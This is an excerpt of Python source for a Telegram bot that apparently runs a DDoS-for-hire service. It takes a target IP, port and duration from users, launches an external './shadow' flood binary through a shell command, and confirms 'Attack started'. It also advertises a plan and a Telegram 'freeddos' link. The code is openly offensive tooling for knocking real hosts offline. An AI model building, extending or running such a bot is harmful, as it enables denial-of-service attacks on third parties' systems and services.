...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./shadow {target_ip} {target_port} {duration} 210")
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*Attack started on 🥳\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
    except Exception as e:
...
def handle_message(message):
    if message.text == "Instant Plan 💟":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/ParveenXfreeddos*", parse_mode='Markdown')
